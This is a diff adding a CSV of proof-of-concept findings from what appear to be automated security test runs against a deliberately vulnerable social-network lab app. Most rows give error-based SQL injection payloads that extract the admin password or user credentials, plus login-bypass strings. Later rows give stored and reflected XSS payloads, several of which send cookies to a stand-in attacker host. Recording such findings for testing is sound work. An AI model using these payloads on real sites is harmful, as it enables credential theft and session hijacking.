@@ -1,0 +1,173 @@
+run_id,endpoint,vulnerability,poc
+20260901-1452-0001,`/profile?username=`,SQL Injection,"`admin'+AND+updatexml(1,concat(0x7e,(SELECT password FROM Users WHERE username='admin' LIMIT 1)),0)--+-`"
+20260901-1452-0001,`/users?search=`,SQL Injection,"`'+OR+updatexml(1,concat(0x7e,(SELECT password FROM Users WHERE username='admin' LIMIT 1)),0)--+-`"
+20260901-1452-0001,`/direct_messages?username=`,SQL Injection,"`'+AND+updatexml(1,concat(0x7e,(SELECT password FROM Users WHERE username='admin' LIMIT 1)),0)--+-`"
+20260901-1452-0001,`/friends?username=`,SQL Injection,"`'+AND+updatexml(1,concat(0x7e,(SELECT password FROM Users WHERE username='admin' LIMIT 1)),0)--+-`"
+20260901-1452-0001,`/friends?search=`,SQL Injection,"`'+AND+updatexml(1,concat(0x7e,(SELECT password FROM Users WHERE username='admin' LIMIT 1)),0)--+-`"
+20260901-1452-0001,`/edit_post?id=`,SQL Injection,"`' AND updatexml(1,concat(0x7e,(SELECT password FROM Users WHERE username='admin' LIMIT 1)),0)--+-`"
+20260901-1452-0001,`/delete_post?id=`,SQL Injection,"`' AND updatexml(1,concat(0x7e,(SELECT password FROM Users WHERE username='admin' LIMIT 1)),0)--+-`"
+20260901-1452-0001,`/requests?username=`,SQL Injection,"`' AND updatexml(1,concat(0x7e,(SELECT password FROM Users WHERE username='admin' LIMIT 1)),0)--+-`"
+20260901-1452-0001,`/create_post` (POST: content),SQL Injection,"`' AND updatexml(1,concat(0x7e,(SELECT password FROM Users WHERE username='admin' LIMIT 1)),0)--+-`"
+20260901-1452-0001,`/edit_post` (POST: id),SQL Injection,"`' AND updatexml(1,concat(0x7e,(SELECT password FROM Users WHERE username='admin' LIMIT 1)),0)--+-`"
+20260901-1452-0001,`/direct_messages` (POST: username),SQL Injection,"`' AND updatexml(1,concat(0x7e,(SELECT password FROM Users WHERE username='admin' LIMIT 1)),0)--+-`"
+20260901-1452-0001,`/request_friend` (POST: username),SQL Injection,"`' AND updatexml(1,concat(0x7e,(SELECT password FROM Users WHERE username='admin' LIMIT 1)),0)--+-`"
+20260901-1452-0001,`/remove_request` (POST: username),SQL Injection,"`' AND updatexml(1,concat(0x7e,(SELECT password FROM Users WHERE username='admin' LIMIT 1)),0)--+-`"
+20260901-1452-0001,`/settings` (POST: name),SQL Injection,"`' AND updatexml(1,concat(0x7e,(SELECT password FROM Users WHERE username='admin' LIMIT 1)),0)--+-`"
+20260901-1452-0001,`/settings` (POST: bio),SQL Injection,"`' AND updatexml(1,concat(0x7e,(SELECT password FROM Users WHERE username='admin' LIMIT 1)),0)--+-`"
+20260901-1516-0002,/profile?username=,SQL Injection,`'` — visible MySQL error
+20260901-1516-0002,/users?search=,SQL Injection,"`'` — visible MySQL error; `1' AND extractvalue(1,concat(0x7e,(SELECT password FROM Users LIMIT 0,1),0x7e))-- x` extracts admin password"
+20260901-1516-0002,/posts?search=,SQL Injection,"`'` — visible MySQL error; `1' AND extractvalue(1,concat(0x7e,(SELECT content FROM Posts LIMIT 0,1),0x7e))-- x` extracts post content"
+20260901-1516-0002,/friends?username=mr_robot&search=,SQL Injection,"`'` — visible MySQL error; `1' AND extractvalue(1,concat(0x7e,(SELECT username1 FROM Friends LIMIT 0,1),0x7e))-- x` extracts friend data"
+20260901-1516-0002,/direct_messages?username=,SQL Injection,`'` — HTTP 500 error
+20260901-1516-0002,/requests?origin=requests&username=,SQL Injection,`'` — HTTP 500 error
+20260901-1516-0002,/requests?origin=profile&username=,SQL Injection,`'` — HTTP 500 error
+20260901-1516-0002,/edit_post?id=,SQL Injection,`'` — HTTP 500 error
+20260901-1516-0002,/delete_post?id=,SQL Injection,`'` — HTTP 500 error
+20260901-1516-0002,POST /create_post (content),SQL Injection,`content='` — visible MySQL error
+20260901-1516-0002,POST /edit_post (content),SQL Injection,`content='&id=<post_id>` — visible MySQL error
+20260901-1537-0003,/profile?username=,SQL Injection,"`admin' AND (extractvalue(1,concat(0x7e,(SELECT password FROM Users WHERE username='admin'))))-- `"
+20260901-1537-0003,/friends?username=,SQL Injection,`admin'` (triggers MySQL error)
+20260901-1537-0003,/users?search=,SQL Injection,`admin'` (triggers MySQL error)
+20260901-1537-0003,/posts?search=,SQL Injection,`admin'` (triggers MySQL error)
+20260901-1537-0003,"/create_post (POST, content)",SQL Injection,`test post'` (triggers MySQL error)
+20260901-1537-0003,"/edit_post (POST, content)",SQL Injection,`edited post'` (triggers MySQL error)
+20260901-1537-0003,"/remove_request (POST, username)",SQL Injection,`stark'` (triggers MySQL error)
+20260901-1537-0003,"/edit_post (POST, id)",SQL Injection,`1'` (triggers HTTP 500)
+20260901-1537-0003,/direct_messages?username=,SQL Injection,`admin'` (triggers HTTP 500)
+20260901-1537-0003,/requests?username=,SQL Injection,`admin'` (triggers HTTP 500)
+20260901-1537-0003,"/direct_messages (POST, username)",SQL Injection,`stark'` (triggers HTTP 500)
+20260901-1537-0003,"/request_friend (POST, username)",SQL Injection,`stark'` (triggers HTTP 500)
+20260902-2013-0001,`/profile?username=`,SQL Injection,`' trash`
+20260902-2013-0001,`/friends?username=`,SQL Injection,`' trash`
+20260902-2013-0001,`/users?search=`,SQL Injection,`' trash`
+20260902-2013-0001,`/friends?username=XXX&search=XXX`,SQL Injection,`' trash`
+20260902-2013-0001,"`/login` (POST, username)",SQL Injection,`' OR 1=1 -- `
+20260902-2013-0001,"`/login` (POST, password)",SQL Injection,`' OR 1=1 -- `
+20260902-2013-0001,"`/signup` (POST, username)",SQL Injection,`' OR 1=1 -- `
+20260902-2013-0001,"`/signup` (POST, name)",SQL Injection,`' OR 1=1 -- `
+20260902-2013-0001,"`/signup` (POST, password)",SQL Injection,`' OR 1=1 -- `
+20260902-2013-0001,"`/create_post` (POST, content)",SQL Injection,`' trash`
+20260902-2013-0001,"`/request_friend` (POST, username)",SQL Injection,`' OR 1=1 -- `
+20260902-2013-0001,"`/remove_request` (POST, username)",SQL Injection,`' trash`
+20260902-2013-0001,`/direct_messages?username=`,SQL Injection,`' trash`
+20260902-2013-0001,`/edit_post?id=`,SQL Injection,`1'`
+20260902-2013-0001,`/delete_post?id=`,SQL Injection,`1'`
+20260902-2013-0001,`/requests?username=`,SQL Injection,`'`
+20260902-2028-0002,GET /profile?username=,SQL Injection,"`mr_robot' AND extractvalue(1,concat(0x7e,(SELECT group_concat(name,0x3a,password) FROM Users),0x7e))-- `"
+20260902-2028-0002,GET /users?search=,SQL Injection,"`' AND extractvalue(1,concat(0x7e,(SELECT group_concat(name,0x3a,password) FROM Users),0x7e))-- `"
+20260902-2028-0002,GET /friends?search=,SQL Injection,"`' AND extractvalue(1,concat(0x7e,(SELECT group_concat(username1,0x3a,username2) FROM Friends),0x7e))-- `"
+20260902-2028-0002,GET /friends?username=,SQL Injection,"`mr_robot' AND extractvalue(1,concat(0x7e,(SELECT group_concat(name,0x3a,password) FROM Users),0x7e))-- `"
+20260902-2028-0002,GET /direct_messages?username=,SQL Injection,`'` (HTTP 500 vs 200)
+20260902-2028-0002,GET /requests?username=,SQL Injection,`'` (HTTP 500)
+20260902-2028-0002,POST /create_post (content),SQL Injection,"`' AND extractvalue(1,concat(0x7e,(SELECT version()),0x7e))-- `"
+20260902-2028-0002,GET /edit_post?id=,SQL Injection,`'` (HTTP 500)
+20260902-2028-0002,POST /edit_post (id),SQL Injection,`'` (HTTP 500)
+20260902-2028-0002,GET /delete_post?id=,SQL Injection,`'` (HTTP 500)
+20260902-2028-0002,POST /settings (name),SQL Injection,`'` (visible MySQL error)
+20260902-2028-0002,POST /settings (bio),SQL Injection,`'` (visible MySQL error)
+20260902-2028-0002,POST /request_friend (username),SQL Injection,`'` (HTTP 500)
+20260902-2028-0002,POST /remove_request (username),SQL Injection,`'` (visible MySQL error)
+20260902-2028-0002,POST /direct_messages (username),SQL Injection,`'` (HTTP 500)
+20260902-2044-0003,`/users?search=`,SQL Injection,"`' AND updatexml(1,concat(0x7e,(SELECT password FROM hackergramdb.Users LIMIT 0,1),0x7e),1)-- `"
+20260902-2044-0003,`/profile?username=`,SQL Injection,`mr_robot'`
+20260902-2044-0003,`/create_post` (POST content),SQL Injection,`'`
+20260902-2044-0003,`/edit_post?id=`,SQL Injection,`1'`
+20260902-2044-0003,`/edit_post` (POST content),SQL Injection,`'`
+20260902-2044-0003,`/delete_post?id=`,SQL Injection,`1'`
+20260902-2044-0003,`/friends?username=`,SQL Injection,`admin' --`
+20260902-2044-0003,`/direct_messages?username=`,SQL Injection,`mr_robot'`
+20260902-2044-0003,`/request_friend` (POST username),SQL Injection,`'`
+20260902-2044-0003,`/remove_request` (POST username),SQL Injection,`'`
+20260902-2044-0003,`/posts?search=`,SQL Injection,`'`
+20260902-2158-0001,`GET /profile?username=`,SQL Injection,"`' AND updatexml(1,concat(0x7e,(SELECT password FROM Users WHERE username='admin')),1)-- `"
+20260902-2158-0001,`GET /users?search=`,SQL Injection,"`' AND updatexml(1,concat(0x7e,(SELECT password FROM Users WHERE username='admin')),1)-- `"
+20260902-2158-0001,`GET /posts?search=`,SQL Injection,"`' AND updatexml(1,concat(0x7e,1),1)-- `"
+20260902-2158-0001,`GET /friends?username=`,SQL Injection,"`' AND updatexml(1,concat(0x7e,1),1)-- `"
+20260902-2158-0001,`GET /requests?username=`,SQL Injection,"`' AND updatexml(1,concat(0x7e,1),1)-- `"
+20260902-2158-0001,`GET /edit_post?id=`,SQL Injection,"`1' AND updatexml(1,concat(0x7e,1),1)-- `"
+20260902-2158-0001,`GET /delete_post?id=`,SQL Injection,"`1' AND updatexml(1,concat(0x7e,1),1)-- `"
+20260902-2158-0001,`POST /request_friend` (username),SQL Injection,"`' AND updatexml(1,concat(0x7e,1),1)-- `"
+20260902-2158-0001,`POST /remove_request` (username),SQL Injection,"`' AND updatexml(1,concat(0x7e,1),1)-- `"
+20260902-2158-0001,`POST /create_post` (content),SQL Injection,"`test' AND updatexml(1,concat(0x7e,1),1)-- `"
+20260902-2158-0001,`POST /edit_post` (id),SQL Injection,"`1' AND updatexml(1,concat(0x7e,1),1)-- `"
+20260902-2219-0002,GET /profile?username=,SQL Injection,`mr_robot'`
+20260902-2219-0002,POST /login (username),SQL Injection,`mr_robot' --`
+20260902-2219-0002,POST /login (password),SQL Injection,`'`
+20260902-2219-0002,GET /users?search=,SQL Injection,`'`
+20260902-2219-0002,GET /friends?username=,SQL Injection,`'%20trash`
+20260902-2219-0002,GET /posts?search=,SQL Injection,`'`
+20260902-2219-0002,POST /create_post (content),SQL Injection,`content='`
+20260902-2219-0002,GET /direct_messages?username=,SQL Injection,`'`
+20260902-2219-0002,POST /direct_messages (username),SQL Injection,`'`
+20260902-2219-0002,POST /request_friend (username),SQL Injection,`username='`
+20260902-2219-0002,POST /remove_request (username),SQL Injection,`username='`
+20260902-2242-0003,`/profile?username=`,SQL Injection,"`admin'+AND+extractvalue(1,concat(0x7e,(SELECT+password+FROM+hackergramdb.Users+WHERE+username='admin')))--+%20`"
+20260902-2242-0003,`/friends?username=`,SQL Injection,"`'+AND+extractvalue(1,concat(0x7e,(SELECT+group_concat(table_name)+FROM+information_schema.tables+WHERE+table_schema='hackergramdb')))--+%20`"
+20260902-2242-0003,`/users?search=`,SQL Injection,`' trash`
+20260902-2242-0003,`/direct_messages?username=`,SQL Injection,`'`
+20260902-2242-0003,`/edit_post?id=`,SQL Injection,`1' trash`
+20260902-2242-0003,`/delete_post?id=`,SQL Injection,`1' trash`
+20260902-2242-0003,`/create_post` (POST `content`),SQL Injection,"`'+AND+extractvalue(1,concat(0x7e,(SELECT+database())))--+%20`"
+20260902-2242-0003,`/edit_post` (POST `id`),SQL Injection,`1' trash`
+20260902-2242-0003,`/remove_request` (POST `username`),SQL Injection,`' trash`
+20260902-2242-0003,`/request_friend` (POST `username`),SQL Injection,`admin' trash`
+20260902-2313-0004,`/profile?username=`,SQL Injection,"`admin' AND updatexml(1,concat(0x7e,(SELECT password FROM Users WHERE username='admin'),0x7e),1)-- `"
+20260902-2313-0004,`/users?search=`,SQL Injection,"`' AND updatexml(1,concat(0x7e,(SELECT password FROM Users WHERE username='admin'),0x7e),1)-- `"
+20260902-2313-0004,`/friends?username=`,SQL Injection,"`' AND updatexml(1,concat(0x7e,(SELECT password FROM Users WHERE username='admin'),0x7e),1)-- `"
+20260902-2313-0004,`/direct_messages?username=`,SQL Injection (Blind),"`1' AND updatexml(1,concat(0x7e,(SELECT password FROM Users WHERE username='admin'),0x7e),1)-- `"
+20260902-2313-0004,`/requests?username=`,SQL Injection (Blind),"`1' AND updatexml(1,concat(0x7e,(SELECT password FROM Users WHERE username='admin'),0x7e),1)-- `"
+20260902-2313-0004,`/edit_post?id=`,SQL Injection (Blind),"`1' AND updatexml(1,concat(0x7e,(SELECT password FROM Users WHERE username='admin'),0x7e),1)-- `"
+20260902-2313-0004,`/delete_post?id=`,SQL Injection (Blind),"`1' AND updatexml(1,concat(0x7e,(SELECT password FROM Users WHERE username='admin'),0x7e),1)-- `"
+20260902-2313-0004,`/login` POST `username`,SQL Injection / Auth Bypass,`' OR '1'='1' -- `
+20260902-2313-0004,`/login` POST `password`,SQL Injection,`' OR '1'='1' -- `
+20260902-2313-0004,`/signup` POST `username`,SQL Injection,"`' AND updatexml(1,concat(0x7e,(SELECT password FROM Users WHERE username='admin'),0x7e),1)-- `"
+20260902-2313-0004,`/signup` POST `password`,SQL Injection,"`' AND updatexml(1,concat(0x7e,(SELECT password FROM Users WHERE username='admin'),0x7e),1)-- `"
+20260902-2313-0004,`/signup` POST `name`,SQL Injection,"`' AND updatexml(1,concat(0x7e,(SELECT password FROM Users WHERE username='admin'),0x7e),1)-- `"
+20260902-2313-0004,`/create_post` POST `content`,SQL Injection,"`' AND updatexml(1,concat(0x7e,(SELECT password FROM Users WHERE username='admin'),0x7e),1)-- `"
+20260902-2313-0004,`/request_friend` POST `username`,SQL Injection (Blind),"`' AND updatexml(1,concat(0x7e,(SELECT password FROM Users WHERE username='admin'),0x7e),1)-- `"
+20260902-2313-0004,`/remove_request` POST `username`,SQL Injection,"`' AND updatexml(1,concat(0x7e,(SELECT password FROM Users WHERE username='admin'),0x7e),1)-- `"
+20260902-2313-0004,`/direct_messages` POST `username`,SQL Injection (Blind),"`' AND updatexml(1,concat(0x7e,(SELECT password FROM Users WHERE username='admin'),0x7e),1)-- `"
+20260902-2313-0004,`/settings` POST `name`,SQL Injection,"`' AND updatexml(1,concat(0x7e,(SELECT password FROM Users WHERE username='admin'),0x7e),1)-- `"
+20260902-2313-0004,`/settings` POST `bio`,SQL Injection,"`' AND updatexml(1,concat(0x7e,(SELECT password FROM Users WHERE username='admin'),0x7e),1)-- `"
+20260903-0634-0005,`POST /create_post`,Stored XSS,"`content=<script>document.location=""http://attacker.example.com/?c""+document.cookie</script>`"
+20260903-0634-0005,`POST /edit_post`,Stored XSS,"`content=<script>document.location=""http://attacker.example.com/?c""+document.cookie</script>&id=19`"
+20260903-0634-0005,`POST /settings`,Stored XSS (bio),"`bio=<script>document.location=""http://attacker.example.com/?c""+document.cookie</script>` (multipart/form-data)"
+20260903-0634-0005,`GET /users?search=`,Reflected XSS,"`/users?search=<script>document.location=""http://attacker.example.com/?c""+document.cookie</script>`"
+20260903-0634-0005,`GET /friends?search=`,Reflected XSS,"`/friends?username=mr_robot&search=<script>document.location=""http://attacker.example.com/?c""+document.cookie</script>`"
+20260903-0634-0005,`POST /request_friend`,Reflected XSS,"`username=<script>document.location=""http://attacker.example.com/?c""+document.cookie</script>`"
+20260903-0657-0006,`POST /create_post`,Stored XSS,"`<script>alert(1)</script>` reflected unescaped in `<p class=""card-text h5"">...</p>`"
+20260903-0657-0006,`POST /edit_post`,Stored XSS,"`<script>alert(1)</script>` reflected unescaped in `<p class=""card-text h5"">...</p>`"
+20260903-0657-0006,`GET /users?search=`,Reflected XSS,`<script>alert(1)</script>` reflected unescaped in `<h6>0 matches for ...</h6>`
+20260903-0657-0006,`POST /request_friend`,Reflected XSS,"`<script>alert(1)</script>` reflected unescaped in `<div class=""flash mb-2 error"">@... does not exist</div>`"
+20260903-0725-0007,`POST /create_post`,Stored XSS,"`content=<script>alert(1)</script>` → reflected as `<p class=""card-text h5""><script>alert(1)</script></p>`"
+20260903-0725-0007,`POST /edit_post`,Stored XSS,"`id=19&content=<script>alert(1)</script>` → reflected as `<p class=""card-text h5""><script>alert(1)</script></p>`"
+20260903-0725-0007,`POST /settings`,Stored XSS (name),"`name=<script>alert(1)</script>` → reflected as `<h4 class=""card-title""><script>alert(1)</script></h4>`"
+20260903-0725-0007,`POST /settings`,Stored XSS (bio),"`bio=<script>alert(1)</script>` → reflected as `<p class=""card-text""><script>alert(1)</script></p>`"
+20260903-0725-0007,`GET /users`,Reflected XSS,`search=<script>alert(1)</script>` → reflected as `<h6>0 matches for <script>alert(1)</script></h6>`
+20260903-0725-0007,`POST /request_friend`,Reflected XSS,"`username=<script>alert(1)</script>` → reflected as `<div class=""flash mb-2 error"">@<script>alert(1)</script> does not exist</div>`"
+20260903-0725-0007,`POST /settings`,Reflected XSS (photo_url),`photo_url=<script>alert(1)</script>` → reflected in flash error message (partially truncated by URL parser)
+20260903-0800-0008,`POST /create_post` (content),Stored Cross-Site Scripting,"`<script>alert(1)</script>` stored and reflected unescaped in `<p class=""card-text h5"">`"
+20260903-0800-0008,`GET /users?search=X` (search),Reflected Cross-Site Scripting,`<script>alert(1)</script>` reflected unescaped in `<h6>` element
+20260903-0800-0008,`POST /request_friend` (username),Reflected Cross-Site Scripting,"`<script>alert(1)</script>` reflected unescaped in `<div class=""flash mb-2 error"">`"
+20260903-0828-0009,`GET /users?search=`,Reflected XSS,`<script>alert(1)</script>` reflected in `<h6>0 matches for <script>alert(1)</script></h6>`
+20260903-0828-0009,`POST /create_post`,Stored XSS,`<script>alert(document.cookie)</script>` stored and reflected unescaped in post card body
+20260903-0828-0009,`POST /edit_post`,Stored XSS,`<script>alert(document.cookie)</script>` stored and reflected unescaped in post card body
+20260903-0828-0009,`POST /settings`,"Stored XSS (name, bio)",`<script>alert(document.cookie)</script>` stored in `name`/`bio` and reflected on profile page
+20260903-0828-0009,`POST /request_friend`,Reflected XSS,`<script>alert(1)</script>` reflected in error message as `@<script>alert(1)</script> does not exist`
+20260903-0942-0011,`/create_post` (POST),Stored XSS (content),`<script>alert(1)</script>`
+20260903-0942-0011,`/edit_post` (POST),Stored XSS (content),`<img src=x onerror=alert(1)>`
+20260903-0942-0011,`/settings` (POST),Stored XSS (name),`<script>alert(1)</script>`
+20260903-0942-0011,`/settings` (POST),Stored XSS (bio),`<script>alert(1)</script>`
+20260903-0942-0011,`/users?search=` (GET),Reflected XSS (search),`<script>alert(1)</script>`
+20260903-0942-0011,`/request_friend` (POST),Reflected XSS (username),`<script>alert(1)</script>`
+20260903-1022-0012,`POST /create_post`,Stored XSS,"`<script>var u=""http://attacker.example/?c=""+document.cookie;new Image().src=u</script>`"
+20260903-1022-0012,`POST /edit_post`,Stored XSS,"`<script>var u=""http://attacker.example/?c=""+document.cookie;new Image().src=u</script>`"
+20260903-1022-0012,`GET /users?search=`,Reflected XSS,"`""><script>document.location=""http://attacker.example.com/steal?c=""+document.cookie</script>`"
+20260903-1022-0012,`POST /request_friend`,Reflected XSS,"`username=""><script>document.cookie</script>`"
+20260903-1047-0013,`/users?search=`,Reflected Cross-Site Scripting,`<script>alert(1)</script>` — reflected unescaped in `<h6>` element
+20260903-1047-0013,`/posts?search=`,Reflected Cross-Site Scripting,`<script>alert(1)</script>` — reflected unescaped in `<h6>` element
+20260903-1121-0014,`GET /users?search=`,Reflected XSS,`<script>alert(1)</script>` reflected in `<h6>0 matches for <script>alert(1)</script></h6>`
+20260903-1121-0014,`GET /friends?username=admin&search=`,Reflected XSS,`<script>alert(1)</script>` reflected in `<h6>0 matches for <script>alert(1)</script></h6>`
+20260903-1121-0014,`POST /create_post`,Stored XSS,"`<script>alert(1)</script>` stored and reflected in `<p class=""card-text h5""><script>alert(1)</script></p>`"
+20260903-1121-0014,`POST /edit_post`,Stored XSS,"`<script>alert(1)</script>` stored and reflected in `<p class=""card-text h5""><script>alert(1)</script></p>`"
+20260903-1121-0014,`POST /request_friend`,Reflected XSS,"`<script>alert(1)</script>` reflected in `<div class=""flash mb-2 error"">@<script>alert(1)</script> does not exist</div>`"
